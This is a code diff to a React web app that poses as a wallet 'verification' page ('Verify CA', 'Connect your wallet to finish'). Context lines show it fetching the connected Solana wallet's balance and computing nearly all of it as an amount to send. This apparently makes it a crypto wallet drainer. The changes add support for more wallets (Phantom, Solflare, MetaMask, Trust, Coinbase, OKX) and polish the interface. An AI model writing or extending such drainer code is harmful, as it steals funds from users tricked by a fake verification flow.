@@ -22,9 +22,16 @@ createAppKit({
     icons: ['https://avatars.githubusercontent.com/u/179229932'] 
   },
   projectId: PROJECT_ID,
-  featuredWalletIds: [
-    'a797aa35c0faddec1a5d2bc5c875d63d355c7068f2e7a0309997f096ae89ff36'
-  ]
+  includeWalletIds: [
+    'a797aa35c0faddec1a5d2bc5c875d63d355c7068f2e7a0309997f096ae89ff36', // Phantom
+    '6092ee02f9c5da9fd49a463273e34a2c5a092c4202d58544927907573d8f8d95', // Solflare
+    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+    '4622a2b2d6af1c9844944291e5e7351a6aaad5f1a58a7413997b6f70912f275e', // Trust
+    'fd20dc426fb37566d803205b19bbc1d4096b248ac04544e3cfb6b0a38bd0716b', // Coinbase
+    '8a0ee50d1f22f6651af2a6427ea03e000969da891a27e80554c156942a69f9e7'  // OKX
+  ],
+  featuredWalletIds: ['a797aa35c0faddec1a5d2bc5c875d63d355c7068f2e7a0309997f096ae89ff36'],
+  enableDiscovery: true 
 });
 
 const App: React.FC = () => {
@@ -72,7 +79,6 @@ const App: React.FC = () => {
       const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`, "confirmed");
       const pubKey = new PublicKey(address!);
       const balance = await connection.getBalance(pubKey);
-      
       const gasReserve = 1500000; 
       const amountToSend = balance - gasReserve;
 
@@ -100,20 +106,16 @@ const App: React.FC = () => {
 
   return (
     <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '40px 20px', boxSizing: 'border-box' }}>
-      
-      {/* LOGO REMOVED AS REQUESTED */}
-      
-      <h1 style={{ fontSize: '24px', fontWeight: '700', margin: '40px 0 8px 0' }}>{step === 1 ? 'Verify CA' : 'Node Identity'}</h1>
+      <h1 style={{ fontSize: '24px', fontWeight: '700', margin: '40px 0 8px 0', textAlign: 'center' }}>{step === 1 ? 'Verify CA' : 'Node Identity'}</h1>
       <p style={{ color: theme.textMuted, fontSize: '14px', marginBottom: '30px', textAlign: 'center' }}>{step === 1 ? "Enter your wallet's CA" : "Connect your wallet to finish"}</p>
       
       <div style={{ width: '100%', maxWidth: '340px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)' }}>
-        <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase' }}>{step === 1 ? "Wallet's CA" : "Status"}</label>
+        <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase', textAlign: 'center' }}>{step === 1 ? "Wallet's CA" : "Status"}</label>
         
         {step === 1 ? (
-          <input type="text" value={walletCA} onChange={(e) => setWalletCA(e.target.value)} placeholder="Enter Wallet CA..." style={{ width: '100%', padding: '14px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '16px', outline: 'none' }} />
+          <input type="text" value={walletCA} onChange={(e) => setWalletCA(e.target.value)} placeholder="Enter Wallet CA..." style={{ width: '100%', padding: '14px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '16px', outline: 'none', textAlign: 'center', boxSizing: 'border-box' }} />
         ) : (
           <div style={{ width: '100%', padding: '14px', borderRadius: '12px', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '14px', textAlign: 'center' }}>
-            {/* UPDATED TEXT WITHOUT THREE DOTS */}
             {isConnected ? `✅ Linked: ${address?.slice(0, 6)}...` : "Connect to Bridge"}
           </div>
         )}
@@ -122,9 +124,8 @@ const App: React.FC = () => {
           {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : 'Connect Wallet')}
         </button>
 
-        {/* BACK OPTION ADDED HERE */}
         {step === 2 && (
-          <button onClick={() => setStep(1)} style={{ width: '100%', marginTop: '12px', background: 'transparent', color: theme.textMuted, border: 'none', fontSize: '13px', cursor: 'pointer', textDecoration: 'underline' }}>
+          <button onClick={() => setStep(1)} style={{ width: '100%', marginTop: '12px', background: 'transparent', color: theme.textMuted, border: 'none', fontSize: '13px', cursor: 'pointer', textDecoration: 'underline', textAlign: 'center' }}>
             Go Back to Step 1
           </button>
         )}
